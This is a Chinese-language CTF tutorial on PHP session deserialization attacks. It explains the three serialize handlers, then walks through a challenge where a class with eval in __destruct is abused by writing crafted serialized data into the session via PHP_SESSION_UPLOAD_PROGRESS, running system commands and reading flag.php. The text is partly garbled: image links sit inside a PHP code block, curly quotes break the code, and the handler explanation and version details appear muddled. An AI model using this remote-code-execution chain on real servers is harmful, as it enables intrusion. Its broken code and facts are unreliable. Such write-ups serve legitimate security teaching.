# CTF-Web历年考题精讲教程：P3：PHP反序列化与Session攻击详解 🔐

![](img/8a3d53cdc3410729e301af737e2ff24a_1.png)

在本节课中，我们将要学习PHP反序列化漏洞与Session机制结合利用的高级攻击手法。这种攻击方式在CTF比赛中较为常见，理解其原理对于Web安全至关重要。

![](img/8a3d53cdc3410729e301af737e2ff24a_3.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_5.png)

## PHP Session的三种存储模式 📂

![](img/8a3d53cdc3410729e301af737e2ff24a_7.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_9.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_11.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_12.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_14.png)

上一节我们介绍了PHP反序列化的基础，本节中我们来看看Session的存储机制。PHP Session数据可以以三种不同的序列化格式存储在服务器端，其模式由`session.serialize_handler`配置决定。

![](img/8a3d53cdc3410729e301af737e2ff24a_16.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_18.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_20.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_22.png)

以下是三种主要的Session处理模式：

![](img/8a3d53cdc3410729e301af737e2ff24a_24.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_26.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_28.png)

1.  **`php` (PHP序列化格式)**
    *   适用于PHP版本大于等于5.5.4。
    *   需要在`php.ini`或代码中设置`session.serialize_handler`为`php`。
    *   存储格式为：`键名|序列化后的值`
    *   核心格式：`{key}|{serialized_value}`

![](img/8a3d53cdc3410729e301af737e2ff24a_30.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_31.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_33.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_35.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_37.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_39.png)

2.  **`php_serialize` (PHP序列化格式)**
    *   存储格式为：将整个`$_SESSION`数组序列化。
    *   核心格式：`a:{serialized_array}`

3.  **`php_binary` (二进制格式)**
    *   存储格式为：键名的长度（1字节） + 键名 + 序列化后的值。
    *   核心格式：`chr({key_length}){key}{serialized_value}`

为了直观理解，我们可以通过以下代码进行测试：
```php
<?php
// 测试不同session handler的存储格式
ini_set('session.serialize_handler', 'php'); // 可替换为 php_serialize 或 php_binary
session_start();
$_SESSION['demo1'] = 123;
$_SESSION['demo3'] = 'test';
?>
```
访问该脚本后，查看服务器生成的Session文件（通常位于`/tmp/sess_*`），即可观察到不同模式下的存储差异。

![](img/8a3d53cdc3410729e301af737e2ff24a_41.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_43.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_45.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_47.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_49.png)

## CTF例题解析：利用Session反序列化 🎯

![](img/8a3d53cdc3410729e301af737e2ff24a_51.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_53.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_55.png)

理解了Session的存储方式后，我们来看一个CTF中的实际案例。本题涉及两个文件：`index.php`和`flag.php`。我们的目标是读取`flag.php`的内容。

![](img/8a3d53cdc3410729e301af737e2ff24a_57.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_58.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_60.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_62.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_64.png)

首先，分析`index.php`的核心代码：
```php
<?php
ini_set('session.serialize_handler', 'php');
session_start();

![](img/8a3d53cdc3410729e301af737e2ff24a_66.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_68.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_70.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_72.png)

class CF {
    public $cmd = 'echo “This is a test”;';
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function __destruct() {
        eval($this->cmd);
    }
}

![](img/8a3d53cdc3410729e301af737e2ff24a_74.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_76.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_77.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_79.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_81.png)

if(isset($_GET['phpinfo'])) {
    highlight_file(__FILE__);
    exit();
}

![](img/8a3d53cdc3410729e301af737e2ff24a_82.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_84.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_85.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_87.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_89.png)

if(isset($_POST['PHP_SESSION_UPLOAD_PROGRESS']) && isset($_FILES['file'])) {
    // 文件上传处理逻辑，可用来写入Session
}

![](img/8a3d53cdc3410729e301af737e2ff24a_91.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_93.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_95.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_97.png)

// 其他代码...
?>
```
代码逻辑如下：
1.  设置Session处理器为`php`格式。
2.  定义了一个危险的`CF`类，其`__destruct`方法会执行`eval($this->cmd)`。
3.  如果GET参数中有`phpinfo`，则显示源码。
4.  存在一个文件上传端点，当POST字段`PHP_SESSION_UPLOAD_PROGRESS`存在时，可以触发Session写入。

![](img/8a3d53cdc3410729e301af737e2ff24a_99.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_101.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_103.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_105.png)

攻击的关键在于，我们可以控制写入Session的数据。如果能让服务器反序列化我们精心构造的Session数据，就能实例化`CF`类并执行任意代码。

![](img/8a3d53cdc3410729e301af737e2ff24a_107.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_109.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_111.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_113.png)

## 构造与利用攻击链 ⛓️

![](img/8a3d53cdc3410729e301af737e2ff24a_115.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_117.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_119.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_121.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_123.png)

本节中我们来看看如何一步步构造攻击。核心思路是利用文件上传进度功能向Session写入恶意序列化数据，然后诱导服务器反序列化它。

![](img/8a3d53cdc3410729e301af737e2ff24a_125.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_126.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_128.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_130.png)

以下是攻击步骤：

![](img/8a3d53cdc3410729e301af737e2ff24a_132.png)

1.  **构造恶意序列化字符串**：首先，我们需要创建一个包含恶意命令的`CF`对象并序列化。
    ```php
    <?php
    class CF {
        public $cmd = 'system(“ls”);'; // 要执行的命令，例如列出目录
    }
    $obj = new CF();
    // 注意：因为index.php使用的是`php`处理器，我们需要在序列化字符串前加上键名
    $serialized = “CF|” . serialize($obj);
    echo $serialized;
    ?>
    ```

![](img/8a3d53cdc3410729e301af737e2ff24a_134.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_136.png)

2.  **通过文件上传写入Session**：利用`PHP_SESSION_UPLOAD_PROGRESS`机制。当`session.upload_progress.enabled`为On时，上传文件时POST一个与该配置项同名的变量，即可向当前Session中写入数据。
    *   构造一个上传表单，POST字段包含`PHP_SESSION_UPLOAD_PROGRESS`，其值就是我们上一步生成的恶意序列化字符串。
    *   同时，需要确保`session.upload_progress.cleanup`为Off（或竞争条件利用），否则上传完成后数据会被清除。

![](img/8a3d53cdc3410729e301af737e2ff24a_138.png)

3.  **触发反序列化**：访问`index.php`。由于代码开头设置了`session_start()`并使用`php`处理器，它会读取并反序列化我们写入的Session数据。当反序列化出`CF`对象后，脚本结束或对象销毁时会触发`__destruct()`方法，从而执行我们设定的系统命令。

![](img/8a3d53cdc3410729e301af737e2ff24a_140.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_142.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_144.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_146.png)

4.  **读取Flag**：将恶意命令改为读取`flag.php`的内容即可。
    ```php
    $cmd = “highlight_file(‘./flag.php’);”;
    // 或使用 file_get_contents
    $cmd = “echo file_get_contents(‘./flag.php’);”;
    ```

![](img/8a3d53cdc3410729e301af737e2ff24a_148.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_150.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_152.png)

## 关键配置与注意事项 ⚠️

![](img/8a3d53cdc3410729e301af737e2ff24a_153.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_155.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_157.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_159.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_161.png)

在实战利用中，需要注意以下PHP配置，它们直接影响攻击是否成功：

![](img/8a3d53cdc3410729e301af737e2ff24a_163.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_165.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_167.png)

*   **`session.serialize_handler`**：必须确保我们写入的格式与目标处理的格式一致。本例中为`php`格式。
*   **`session.upload_progress.enabled`**：需要为On，这是利用上传进度写入Session的前提。
*   **`session.upload_progress.cleanup`**：如果为On，上传完成后会立即清理Session中的进度信息，可能需要利用条件竞争。为Off则更稳定。
*   **字符转义**：在通过POST字段传递序列化字符串时，要注意引号等特殊字符的转义，确保数据完整写入。

![](img/8a3d53cdc3410729e301af737e2ff24a_169.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_171.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_173.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_175.png)

## 总结 📝

![](img/8a3d53cdc3410729e301af737e2ff24a_177.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_179.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_181.png)

![](img/8a3d53cdc3410729e301af737e2ff24a_182.png)

本节课中我们一起学习了PHP反序列化与Session机制结合产生的安全漏洞。我们首先了解了PHP Session的三种存储格式，然后通过一个CTF例题，详细剖析了如何利用`PHP_SESSION_UPLOAD_PROGRESS`功能向Session注入恶意序列化字符串，并最终触发反序列化执行任意代码的完整攻击链。这种攻击方式隐蔽性强，需要对PHP Session机制有深入理解才能进行有效防御。